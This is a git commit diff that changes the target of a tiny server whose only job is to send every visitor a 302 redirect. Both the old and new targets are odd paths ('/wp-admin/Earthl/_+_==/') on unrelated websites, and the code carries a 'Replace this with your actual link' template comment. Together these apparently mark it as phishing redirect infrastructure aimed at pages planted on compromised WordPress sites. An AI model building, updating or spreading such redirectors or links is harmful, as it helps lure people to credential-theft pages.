5746d805149fbcef34bd2f25fa2b8d3c9df9bded
Digital2025001 <bosmichael30@gmail.com>
2025-09-23 06:09:18 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://mathieu-mariac-smartcover.comhit.fr/wp-admin/Earthl/_+_==/", // Replace this with your actual link
+      Location: "https://moviesbyespresso.com/wp-admin/Earthl/_+_==/", // Replace this with your actual link
     },
   });
 });
